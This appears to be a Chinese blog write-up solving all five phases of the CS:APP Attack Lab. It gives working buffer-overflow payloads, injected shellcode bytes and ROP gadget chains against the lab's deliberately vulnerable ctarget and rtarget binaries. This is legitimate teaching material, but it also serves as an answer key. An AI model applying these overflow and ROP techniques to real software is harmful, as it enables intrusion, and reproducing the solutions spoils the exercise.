### Ctarget
## phase 1
根据描述文档
```markdown
unsigned getbuf()
 {
char buf[BUFFER_SIZE];
Gets(buf);
return 1;
}

 void test()
 {
 int val;
 val = getbuf();
printf("No exploit. Getbuf returned 0x%x\n", val);
}

 void touch1()
 {
 vlevel = 1; /* Part of validation protocol */
printf("Touch1!: You called touch1()\n");
validate(1);
exit(0);
 }

```
Ctarget 1的入口函数为void test()，目标是通过输入时的溢出将其跳转到touch1（）。
反汇编输入函数getbuf
```markdown
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
```
<+0>发现该函数开辟了40字节的空间，而Gets函数没有输入字符的判定，因此可输入40个字符。
![l3c1](https://img-blog.csdnimg.cn/d52eb9f4972449098529c3903fd2cb55.jpeg)
Gets函数不限制输入格数，我们只要将输入的数据覆盖函数返回值处的地址即可到达touch1。查看touch1的地址
```markdown
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:    call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:    mov    $0x1,%edi
   0x00000000004017dd <+29>:    call   0x401c8d <validate>
   0x00000000004017e2 <+34>:    mov    $0x0,%edi
   0x00000000004017e7 <+39>:    call   0x400e40 <exit@plt>
End of assembler dump.
```
Touch1的入口地址为0x4017c0。
机器为小端法表示，因此我们输入的字符转化为16进制后应该为（所需的为最后三个字符，其他可以任填）：
```markdown
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
C0 17 40
```
一个地址等于一个字节，一个字节存储一个字符,一个字节对应用两位16进制表示。
用hex2raw将目标码还原为输入的字符串。
在当前环境同目录下创建“exploit.txt”，在里面输入“30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 c0 17 40”
保存后，在终端输入
```markdown
root@cc661f098d2e:/csapp/3attack# ./hex2raw < exploit.txt > exploit-raw.txt
root@cc661f098d2e:/csapp/3attack# ./ctarget -i exploit-raw.txt -q
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40
```
成功！
## phase2
根据题意，运行ctarget跳转到touch2，并完成验证即可过关。以下是touch2的c呈现
```markdown
void touch2(unsigned val)
 {
 vlevel = 2; /* Part of validation protocol */
 if (val == cookie) {
 printf("Touch2!: You called touch2(0x%.8x)\n", val);
 validate(2);
 } else {
printf("Misfire: You called touch2(0x%.8x)\n", val);
fail(2);
}
exit(0);
}
```
前置知识：程序的运行过程是存储在一个区域，而rsp指向该区域的最低地址（栈顶）。（栈向低地址处增长，调用函数时，rsp减小，开辟一定的空间（栈帧）存储函数的局部变量）Ret指令为pop （rsp）给rip以指示下一条代码所在地址。
本题我的cookie为：0x59b997fa
思路：传入val=cookie，然后跳转到函数touch2。
按照level 1只要覆盖返回处的地址即可跳转，可本题在getbuf的ret前需要先执行movq $0x59b997fa,%rdi 。而getbuf所在与存储传入数据所在地并不相邻，因此溢出攻击只能覆盖getbuf的ret，因此我们不能直接将该处的返回值设备touch2的地址，而是需要将该处的返回值设为存储接收值的地址，在该处通过修改rdi完成数据的输入。

所以整个流程为：getbuf的ret->movq $0x59b997fa,%rdi->jmp &touch2()

接下来操作：
通过getbuf传入的数据的首地址为getbuf<+4>处rsp的值，因此我们查看。


```markdown
root@cc661f098d2e:/csapp/3attack# gdb ctarget
(gdb) break getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run -q -i exploit.txt
(gdb) nexti
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
(gdb) info r rsp
rsp            0x5561dc78          0x5561dc78
```
其中run -q -i exploit.txt的exploit.txt的文件名和内容任意，但是必须要有-i<file>作为输入，否则run -q运行时会报错，导致rsp获取不准。
综上，getbuf的ret应为0x5561dc78，易得touch2的地址为0x4017ec。由于文档不建议使用jmp指令我们需将其拆解为，建立一个example.s文件，在里面输入：
```markdown
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```
在终端执行
```markdown
root@cc661f098d2e:/csapp/3attack# gcc -c example.s
root@cc661f098d2e:/csapp/3attack# objdump -d example.o > example.d
```
得到example.d文件，查看
```markdown
0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```
因此注入字符转16进制后为
```markdown
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00       
00 00 00 00 00 00 00 00   
00 00 00 00 00 00 00 00  
78 dc 61 55  
```
后续操作与leve1相同，不赘述。
![l3c2](https://img-blog.csdnimg.cn/35470d307cad4a6789a85bbc5117c69e.jpeg)

## phase 3
已知，题目要求：跳转到touch3，并完成cookie验证
```markdown
 /* Compare string to hex represention of unsigned value */
 int hexmatch(unsigned val, char *sval)
 {
 char cbuf[110];
 /* Make position of check string unpredictable */
 char *s = cbuf + random() % 100;
 sprintf(s, "%.8x", val);
 return strncmp(sval, s, 9) == 0;
 }

void touch3(char *sval)
 {
 vlevel = 3; /* Part of validation protocol */
 if (hexmatch(cookie, sval)) {
 printf("Touch3!: You called touch3(\"%s\")\n", sval);
 validate(3);
 } else {
 printf("Misfire: You called touch3(\"%s\")\n", sval);
 fail(3);
 }
 exit(0);
 }
```

如出一辙，我们需要通过test中的getbuf跳转到touch3。与level2不同，touch3传入的是一个字符串*sval，也是我们需要传入的变量，c中函数接受字符串的首地址。Touch3中的cookie应该为一个全局变量，我们不需要管。我们发现touch3调用了hexmatch函数，且返回值为true（非0）时才能完成验证，我们接下来观察hexmatch在干什么。将我们传入的sval与s相比，若前九个相同则验证成功。其中s的值为全局变量cookie。因此我们需要做的是将存储我们cookie（0x59b997fa对应的16进制的ascii码，不需要前导0x）的首地址传入。而因为random函数的存在，s的首地址是不固定的。也就是说，如果我们将待传入的cookie放在hexmatch的栈帧中，则很有可能会被覆盖。如果放在getbuf’的栈帧中呢？当我们完成getbuf函数后，空间会被释放，rsp上移，在调用hexmatch时rsp又会下移开辟空间，因此getbuf和hexmatch的栈帧会有重叠，也就是说当getbuf函数结束时，getbuf栈帧中的数据就有可能被更改。因此，我们需要将数据存储在getbuf栈帧开始处之前。
类似于level2的操作，调用getbuf时栈顶（rsp）为0x5561dca0。我们知道，call（调用函数时），会将调用者call的下一条地址push（入栈），所以，此时的rsp为getbuf函数结束时的返回地址，我们需要在+8（0x5561dca8）处存储我们的cookie。通过查表，易得我们cookie对应的16进制为：35 39 62 39 39 37 66 61。结合level 2，该数据应该放在存储输入首地址的+48处。易知touch3的地址为0x4018fa。在进入touch3前我们要完成movq $0x5561dca8,%rdi的操作。而其他流程与level2类似，不赘述。因此，整个流程为：输入56个字符，输入字符的最后一行（若8字节一行）对应的地址存储我们的cookie，倒数第二行为重定向地址，重定向到输入字符的开始处执行我们注入的代码。在进入touch3前我们需要进行
```markdown
movq $0x5561dca8,%rdi
pushq $0x4018fa
ret
```
因此注入字符的16进制为
```markdown
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00 
```
其中最后一行的00表示存储数据字符串的结尾“/0”
后续操作与前面部分雷同，不赘述。

### rtarget
总览：栈帧随机化且不可执行，用rop进行攻击

## phase4
要求：用rop在rtarget下完成phase2
rtarget中可用的gadget在farm.c文件中，根据题意只需要使用两个，且在start_farm到mid_farm之间。
开始思路，根据示例提示，我们需要利用farm.c中的gadgets。现在遇到问题1：如何获取其机器码，此刻我们可以很自然的联想到，在*.s文件中编写汇编后使用命令
```markdown
gcc -c *.s
unix> objdump -d *.o > *.d
```
查看机器码。此刻需要注意：返回类型均为unsigned，因此操作大小为l。但此刻会出现一个问题，addval函数的汇编实现有两种，add和lea，我们无法确定编译器使用的是哪种，因此我们用gdb’的disas查看，整理汇总得到如下（每个函数都有ret，下略）：
```markdown
  0000000000000000 <.text>:
   0:	b8 fb 78 90 90       	mov    $0x909078fb,%eax            /*getval_142:0x000000000040199a <+0>:*/  
   6:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax      /*addval_273:0x00000000004019a0 <+0>: */ 
   c:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax      /*addval_219:0x00000000004019a7 <+0>:*/
  12:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)          /*setval_237:0x00000000004019ae <+0>:*/ 
  18:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)          /*setval_424:0x00000000004019b5 <+0>:*/
  1e:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)          /*setval_424:0x00000000004019b5 <+0>:*/
  24:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)          /*setval_426:0x00000000004019c3 <+0>:*/....
  2a:	b8 29 58 90 c3       	mov    $0xc3905829,%eax            /*getval_280:0x00000000004019ca <+0>:*/
```
为了完成，我么需要的流程为：传入touch2接受的val，跳转到touch2。
我们知道，标准规定下，传入的第一个变量存储在rdi中，查看attacklab.pdf的3A-D，我们在上述机器码中搜索5f（pop rdi）没有找到。因此，rdi不能从内存中获取。我们再搜索移动指令“48 89 ||89”我们发现，其后面跟的都是c7，查阅得：在这些gadget下我们只能执行movl eax,edi || movq rax,rdi的操作。也就是我们需要先将val传给ax再mov给di。我们搜索58（pop rax）发现可以找到，因此为了匹配，我们选择movq rax,rdi。解决流程变为了：将==cookie的val值入栈（push）=》pop rax=》movq rax,rdi=》jmp <touch2>。
根据上述机器码我们易得：
```markdown
0x4019ab<+0>：58 popq rax
		 <+1>:90 nop
		 <+6>: C3 ret
		
0x4019a2<+0>：48 89 c7 movq rax,rdi
		  <+4>:C3 ret
0x4019c5<+0>: 48 89 c7 movq rax,rdi
		<+3>C3 ret
        <+4>C3 ret
```
![l3r1](https://img-blog.csdnimg.cn/8ea2afff29ad4531a7164f231f852aef.jpeg)
而我们只能通过getbuf的溢出实现。现在以无法在getbuf的栈帧中注入代码且执行，我们要利用程序已有的函数进行攻击。
我们在getbuf栈帧起始位置注入完毕后，getbuf函数要返回时(运行到ret处①，空间已释放add 0x28 0->①，%rsp指向test的栈帧顶)，我们想要执行pop rax的操作。因此在存储ret返回地址处①我们需要其跳转到一个gadget，根据以上，此处值应为0x4019ab。Getbuf的Ret执行后发生了：pop %rip;此时rsp指向了②。程序跳转到0x4019ab<+0>开始执行pop rax。此时rax=②处的值，因此②处的值应为我们的cookie：0x596997fa，rsp=③。在执行到<+6>ret时，此时rip=③处的值，rsp=④。接下来我们要执行mov rax,rdi。通过上述我们发现，有两个函数可以满足，任选其一即可。因此③处的值应为0x4019a2或0x4019c5。在执行ret时，弹出栈顶，程序运行④处值的地址，因此④处的值为0x4017ec(touch2函数的地址)。综上，我们注入的代码（已经破坏了test的栈帧和其之前的原始数据）转化为16进制为
```markdown
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```
后续验与前同，不赘述。

## phase 5
题目：传入*sval，跳转到touch3，用rop完成phase3的攻击。使用的gadget在start_farm~start_end,以下省略每个函数的ret
```markdown
b8 fb 78 90 90       	/*getval_142:0x000000000040199a <+0>:*/     mov    $0x909078fb,%eax
8d 87 48 89 c7 c3    	/*addval_273:0x00000000004019a0 <+0>: */    lea    -0x3c3876b8(%rdi),%eax
8d 87 51 73 58 90    	/*addval_219:0x00000000004019a7 <+0>:*/     lea    -0x6fa78caf(%rdi),%eax
c7 07 48 89 c7 c7    	/*setval_237:0x00000000004019ae <+0>:*/     movl   $0xc7c78948,(%rdi)
c7 07 54 c2 58 92    	/*setval_424:0x00000000004019b5 <+0>:  */   movl   $0x9258c254,(%rdi)
c7 07 63 48 8d c7    	/*setval_470:0x00000000004019bc <+0>:  */   movl   $0xc78d4863,(%rdi)
c7 07 48 89 c7 90    	/*setval_426:0x00000000004019c3 <+0>: */    movl   $0x90c78948,(%rdi)
b8 29 58 90 c3       	/*getval_280:0x00000000004019ca <+0>: */    mov    $0xc3905829,%eax
48 8d 04 37          	/*0x00000000004019d6 <add_xy+0>:          */lea    (%rdi,%rsi,1),%rax
b8 5c 89 c2 90       	   /*0x00000000004019db <getval_481+0>:   */mov    $0x90c2895c,%eax
c7 07 99 d1 90 90    	   /*0x00000000004019e1 <setval_296+0>:   */movl   $0x9090d199,(%rdi)
8d 87 89 ce 78 c9    	   /*0x00000000004019e8 <addval_113+0>:   */lea    -0x36873177(%rdi),%eax
8d 87 8d d1 20 db    	   /*0x00000000004019ef <addval_490+0>:   */lea    -0x24df2e73(%rdi),%eax
b8 89 d1 48 c0       	   /*0x00000000004019f6 <getval_226+0>:   */mov    $0xc048d189,%eax
c7 07 81 d1 84 c0    	   /*0x00000000004019fc <setval_384+0>:   */movl   $0xc084d181,(%rdi)
8d 87 41 48 89 e0    	   /*0x0000000000401a03 <addval_190+0>:   */lea    -0x1f76b7bf(%rdi),%eax
c7 07 88 c2 08 c9    	   /*0x0000000000401a0a <setval_276+0>:   */movl   $0xc908c288,(%rdi)
8d 87 89 ce 90 90    	   /*0x0000000000401a11 <addval_436+0>:   */lea    -0x6f6f3177(%rdi),%eax
b8 48 89 e0 c1       	   /*0x0000000000401a18 <getval_345+0>:   */mov    $0xc1e08948,%eax
8d 87 89 c2 00 c9    	   /*0x0000000000401a1e <addval_479+0>:   */lea    -0x36ff3d77(%rdi),%eax
8d 87 89 ce 38 c0    	   /*0x0000000000401a25 <addval_187+0>:   */lea    -0x3fc73177(%rdi),%eax
c7 07 81 ce 08 db    	   /*0x0000000000401a2c <setval_248+0>:   */movl   $0xdb08ce81,(%rdi)
b8 89 d1 38 c9       	   /*0x0000000000401a33 <getval_159+0>:   */mov    $0xc938d189,%eax
8d 87 c8 89 e0 c3    	   /*0x0000000000401a39 <addval_110+0>:   */lea    -0x3c1f7638(%rdi),%eax
8d 87 89 c2 84 c0    	   /*0x0000000000401a40 <addval_487+0>:   */lea    -0x3f7b3d77(%rdi),%eax
8d 87 48 89 e0 c7    	   /*0x0000000000401a47 <addval_201+0>:   */lea    -0x381f76b8(%rdi),%eax
b8 99 d1 08 d2       	   /*0x0000000000401a4e <getval_272+0>:   */mov    $0xd208d199,%eax
b8 89 c2 c4 c9       	   /*0x0000000000401a54 <getval_155+0>:   */mov    $0xc9c4c289,%eax
c7 07 48 89 e0 91    	   /*0x0000000000401a5a <setval_299+0>:   */movl   $0x91e08948,(%rdi)
8d 87 89 ce 92 c3    	   /*0x0000000000401a61 <addval_404+0>:   */lea    -0x3c6d3177(%rdi),%eax
b8 89 d1 08 db       	   /*0x0000000000401a68 <getval_311+0>:   */mov    $0xdb08d189,%eax
c7 07 89 d1 91 c3    	   /*0x0000000000401a6e <setval_167+0>:   */movl   $0xc391d189,(%rdi)
c7 07 81 c2 38 d2    	   /*0x0000000000401a75 <setval_328+0>:   */movl   $0xd238c281,(%rdi)
c7 07 09 ce 08 c9    	   /*0x0000000000401a7c <setval_450+0>:   */movl   $0xc908ce09,(%rdi)
8d 87 08 89 e0 90    	   /*0x0000000000401a83 <addval_358+0>:   */lea    -0x6f1f76f8(%rdi),%eax
8d 87 89 c2 c7 3c    	   /*0x0000000000401a8a <addval_124+0>:   */lea    0x3cc7c289(%rdi),%eax
b8 88 ce 20 c0       	   /*0x0000000000401a91 <getval_169+0>:   */mov    $0xc020ce88,%eax
c7 07 48 89 e0 c2    	   /*0x0000000000401a97 <setval_181+0>:   */movl   $0xc2e08948,(%rdi)
8d 87 89 c2 60 d2    	   /*0x0000000000401a9e <addval_184+0>:   */lea    -0x2d9f3d77(%rdi),%eax
b8 8d ce 20 d2       	   /*0x0000000000401aa5 <getval_472+0>:   */mov    $0xd220ce8d,%eax
```
字符串传入的是首地址，可现在的问题是，栈随机化后，我们存储的cookie的字符串的地址无法确定。我们首先很自然的想到，能不能将cookie放在getbuf的栈顶，然后获取rsp即可。很可惜，查阅attack.pdf中的3A~D与上述gadget，发现并不能直接pop rdi。此处便涉及到一个问题：如何确定存储cookie的地址。我们查阅gadget，发现了一个返回x+y的函数。而函数的第一个和第二个参数分别对应rdi（long x）和rsi（long y），即rax=rdi+rsp。因此我们可以用该函数的返回值rax(rsp+偏移量)来确定cookie放在哪,然后就rax传给rdi，转到touch3即可。因此我们要确定rdi和rsp分别代表什么。查阅机器码的含义与gadget中可以使用的机器码我们发现rax可以直接赋值给rdi：rax->rdi，而si只能被cx赋值（下同），即ecx->esi;edx->ecx;eax->edx。因此计算出偏移量后我们需要先传给ax，再通过一系列操作才能赋给si。又有可以利用的pop rax.因我们只需计算出偏移量，将其通过溢出注入内存即可。那么最开始只需将rsp->rax,rax->rdi即可为实现上述步骤。综上，我们需要执行的汇编操作如下（同时指令分别对应低到高地址的栈存储情况，每条8字节）
```markdown
1：movq %rsp，%rax
2：movq %rax，%rdi
3：pop %rax
4：（此处存储偏移量，为pop给ax的数据）
5：mov %eax，%edx
6：mov %edx，%ecx
7：mov %ecx，%esi
8：lea    (%rdi,%rsi,1),%rax
9：movq %rax，%rdi
10：(touch3地址)
11：（cookie的ascii值）
```
我们若把cookie的值存在11处，1处的rax记录的rsp在2处。（rsp的指向雷同phas 4不赘诉）而11处的地址相对于2处的偏移量为9，而一行为8字节，因此偏移量为8*9=72=0x48.因此4处的值为48
综上，查阅对应机器码，注入字符的16进制为（注入答案不唯一）
```markdown
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```
后续操作相同，不赘诉。
### 总结
到此，attack lab全部结束。
